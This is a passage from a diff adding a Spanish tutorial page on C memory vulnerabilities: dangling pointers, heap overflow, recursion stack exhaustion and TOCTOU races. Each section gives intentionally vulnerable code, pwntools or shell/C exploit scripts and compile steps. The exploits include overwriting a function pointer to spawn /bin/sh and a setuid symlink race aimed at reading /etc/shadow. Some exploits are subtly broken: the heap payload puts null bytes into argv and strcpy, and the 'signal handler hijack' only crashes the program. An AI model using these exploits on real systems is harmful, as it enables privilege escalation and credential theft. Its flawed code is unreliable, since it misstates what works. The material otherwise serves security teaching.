+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> x <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>x;    <span style="color:#75715e">// 💥 x muere al retornar, pero devolvemos su dirección
+</span></span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Versión más explotable:
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">get_buffer</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Dame input para buf: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">64</span>, stdin);
+</span></span><span style="display:flex;"><span>    buf[<span style="color:#a6e22e">strcspn</span>(buf, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> buf;   <span style="color:#75715e">// 💥 dangling pointer al stack frame de get_buffer
+</span></span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">overwrite_stack</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Esta función usa el mismo espacio de stack que get_buffer usó
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Sus variables locales sobreescribirán lo que había en buf
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> local[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(local, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">64</span>);  <span style="color:#75715e">// llena de &#39;A&#39;s el stack
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// (no hace nada con el retorno, solo ocupa el stack)
+</span></span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p  <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_buffer</span>();       <span style="color:#75715e">// p apunta a buf (ya muerto)
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">overwrite_stack</span>();              <span style="color:#75715e">// sobreescribe esa zona
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Valor: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, p);     <span style="color:#75715e">// 💥 imprime lo que puso overwrite_stack
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit-1">Exploit</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_dangling.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># El atacante controla lo que se escribe en la zona</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># que el dangling pointer va a leer/ejecutar</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./vuln_dangling&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enviamos input a get_buffer()</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Luego overwrite_stack() sobreescribe esa zona</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># printf lee datos controlados por nosotros</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>WIN <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401196</span>  <span style="color:#75715e"># si hubiera una función win()</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># En este ejemplo simple solo observamos la corrupción:</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;SECRETO&#39;</span>)
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall())
+</span></span></code></pre></div><h3 id="compilar">Compilar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_dangling vuln_dangling.c -O0   <span style="color:#75715e"># -O0 para que no optimize el dangling</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># El compilador moderno con -Wall nos avisa:</span>
+</span></span><span style="display:flex;"><span>gcc -Wall -o vuln_dangling vuln_dangling.c
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># warning: function returns address of local variable</span>
+</span></span></code></pre></div><hr>
+<h2 id="7-heap-overflow-directo">7. Heap Overflow (directo)</h2>
+<p><strong>CWE-122</strong> — Crítico</p>
+<h3 id="mecanismo-6">Mecanismo</h3>
+<p>Buffer en el heap con límite insuficiente. Al sobrepasar, se corrompen:
+los datos del siguiente objeto (variable confusion), o la metadata del heap (chunk headers).
+A diferencia del BOF de stack, no hay return address directo — se abusa de estructuras del heap.</p>
+<h3 id="código-vulnerable-6">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_heapof.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>  is_admin;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>greet)();
+</span></span><span style="display:flex;"><span>} User;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">greet_user</span>()  { <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Hola, usuario normal.&#34;</span>); }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">greet_admin</span>() { <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Hola, ADMIN.&#34;</span>); <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>); }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    User <span style="color:#f92672">*</span>u1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(User));
+</span></span><span style="display:flex;"><span>    User <span style="color:#f92672">*</span>u2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(User));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    u1<span style="color:#f92672">-&gt;</span>is_admin <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    u1<span style="color:#f92672">-&gt;</span>greet    <span style="color:#f92672">=</span> greet_user;
+</span></span><span style="display:flex;"><span>    u2<span style="color:#f92672">-&gt;</span>is_admin <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    u2<span style="color:#f92672">-&gt;</span>greet    <span style="color:#f92672">=</span> greet_user;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 💥 sin límite: si argv[1] &gt; 32 bytes, pisamos is_admin y greet de u1
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(u1<span style="color:#f92672">-&gt;</span>name, argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;u1-&gt;is_admin = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, u1<span style="color:#f92672">-&gt;</span>is_admin);
+</span></span><span style="display:flex;"><span>    u1<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">greet</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit-2">Exploit</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_heapof.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./vuln_heapof&#39;</span>)
+</span></span><span style="display:flex;"><span>p   <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./vuln_heapof&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GREET_ADMIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;greet_admin&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Layout de User:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   name[32]     offset 0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   is_admin     offset 32</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   greet()      offset 40 (con padding de alineación)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>           <span style="color:#75715e"># llenar name</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">1</span>)              <span style="color:#75715e"># is_admin = 1</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>        <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(GREET_ADMIN)   <span style="color:#75715e"># sobreescribir puntero greet</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;./vuln_heapof&#39;</span>, payload<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;latin-1&#39;</span>)])
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="compilar-1">Compilar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_heapof vuln_heapof.c -fno-stack-protector -no-pie
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inspeccionar layout:</span>
+</span></span><span style="display:flex;"><span>gdb vuln_heapof
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (gdb) b main</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (gdb) run AAAA</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (gdb) p sizeof(User)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (gdb) p &amp;u1-&gt;name, &amp;u1-&gt;is_admin, &amp;u1-&gt;greet</span>
+</span></span></code></pre></div><hr>
+<h2 id="8-stack-overflow-via-recursión">8. Stack Overflow via Recursión</h2>
+<p><strong>CWE-674</strong> — Medio</p>
+<h3 id="mecanismo-7">Mecanismo</h3>
+<p>Recursión sin caso base o con entrada controlada por el usuario → stack exhaustion → SIGSEGV.
+En ciertos contextos (parsers, evaluadores), el atacante puede controlar la profundidad.
+Si hay signal handlers, la señal SIGSEGV puede ser capturada → execution hijack.</p>
+<h3 id="código-vulnerable-7">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_recursion.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Cada llamada usa ~N bytes de stack (variables locales)
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">fib</span>(<span style="color:#66d9ef">long</span> n) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> padding[<span style="color:#ae81ff">1024</span>];   <span style="color:#75715e">// fuerza consumo de stack rápido
+</span></span></span><span style="display:flex;"><span>    padding[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> n;       <span style="color:#75715e">// evitar que optimizer elimine padding
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fib</span>(n<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">fib</span>(n<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>);  <span style="color:#75715e">// sin memoización → exponencial + stack overflow
+</span></span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Con signal handler explotable:
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>sigusr_handler)() <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sighandler</span>(<span style="color:#66d9ef">int</span> sig) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sigusr_handler)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sigusr_handler</span>();   <span style="color:#75715e">// 💥 si logramos sobreescribir sigusr_handler
+</span></span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">signal</span>(SIGSEGV, sighandler);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> n <span style="color:#f92672">=</span> <span style="color:#a6e22e">atol</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">fib</span>(n));   <span style="color:#75715e">// crash con n grande
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit--signal-handler-hijack">Exploit — signal handler hijack</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># exploit_recursion.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># La recursión profunda sobrescribe el stack hacia las variables globales</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (stack grows down, si hay un buffer en el stack podemos alcanzar el heap/BSS)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Técnica más directa: controlar el signal handler via otra vuln</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;./vuln_recursion&#39;</span>, <span style="color:#e6db74">&#39;100000&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># El proceso crashea con SIGSEGV</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Si podemos sobreescribir sigusr_handler antes del crash → RIP control</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>wait()
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Exit code:&#34;</span>, p<span style="color:#f92672">.</span>poll())
+</span></span></code></pre></div><h3 id="compilar-2">Compilar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_recursion vuln_recursion.c
+</span></span><span style="display:flex;"><span>ulimit -s          <span style="color:#75715e"># ver límite de stack (default ~8MB)</span>
+</span></span><span style="display:flex;"><span>ulimit -s unlimited  <span style="color:#75715e"># para probar con valores aún más grandes</span>
+</span></span><span style="display:flex;"><span>./vuln_recursion <span style="color:#ae81ff">10000</span>
+</span></span></code></pre></div><hr>
+<h2 id="9-race-condition--toctou">9. Race Condition / TOCTOU</h2>
+<p><strong>CWE-362 / CWE-367</strong> — Alto</p>
+<h3 id="mecanismo-8">Mecanismo</h3>
+<p>Time-Of-Check to Time-Of-Use: el programa verifica algo (ej: si un archivo es del usuario),
+luego actúa sobre ello. Entre el check y el use, el atacante cambia la condición (ej: reemplaza el archivo con un symlink).
+Muy común en setuid programs.</p>
+<h3 id="código-vulnerable-8">Código vulnerable</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// vuln_toctou.c  (debe compilarse y ejecutarse como setuid root)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>) { <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Uso: prog &lt;archivo&gt;&#34;</span>); <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// CHECK: verificar que el usuario real puede leer el archivo
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">access</span>(argv[<span style="color:#ae81ff">1</span>], R_OK) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Acceso denegado&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 💥 VENTANA: entre access() y open() el atacante puede
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">//    reemplazar argv[1] con un symlink a /etc/shadow
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// USE: abrir y mostrar el archivo (con privilegios root del setuid)
+</span></span></span><span style="display:flex;"><span>    FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>f) { <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;fopen&#34;</span>); <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">256</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">fgets</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf), f))
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, buf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(f);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="exploit--symlink-race">Exploit — symlink race</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># exploit_toctou.sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Requiere que vuln_toctou sea setuid root</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Preparar archivo de prueba (que pasa el access check)</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;archivo inofensivo&#34;</span> &gt; /tmp/myfile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># En un terminal, correr el programa en loop con nuestro archivo</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    ./vuln_toctou /tmp/myfile 2&gt;/dev/null
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> &amp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># En otro &#34;hilo&#34; (loop), alternar el symlink durante la ventana TOCTOU</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Symlink apunta al archivo de usuario (pasa el access() check)</span>
+</span></span><span style="display:flex;"><span>    ln -sf /tmp/myfile /tmp/target
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Muy rápido, cambiar a /etc/shadow (lo usa el fopen() privilegiado)</span>
+</span></span><span style="display:flex;"><span>    ln -sf /etc/shadow /tmp/target
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><h3 id="exploit-en-c-más-rápido-y-preciso">Exploit en C (más rápido y preciso)</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// exploit_toctou_fast.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Loop de alta velocidad alternando el symlink
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Para ganar la race con más probabilidad que un script bash
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">symlink</span>(<span style="color:#e6db74">&#34;/tmp/safe_file&#34;</span>, <span style="color:#e6db74">&#34;/tmp/race_target&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// (el programa verifica aquí — pasa)
+</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unlink</span>(<span style="color:#e6db74">&#34;/tmp/race_target&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">symlink</span>(<span style="color:#e6db74">&#34;/etc/shadow&#34;</span>, <span style="color:#e6db74">&#34;/tmp/race_target&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// (el programa usa aquí — lee /etc/shadow)
+</span></span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unlink</span>(<span style="color:#e6db74">&#34;/tmp/race_target&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="compilar-y-configurar">Compilar y configurar</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -o vuln_toctou vuln_toctou.c
+</span></span><span style="display:flex;"><span>sudo chown root vuln_toctou
+</span></span><span style="display:flex;"><span>sudo chmod u+s vuln_toctou    <span style="color:#75715e"># setuid bit</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gcc -o exploit_toctou exploit_toctou_fast.c
+</span></span></code></pre></div><hr>
+<h2 id="10-signedunsigned-mismatch">10. Signed/Unsigned Mismatch</h2>
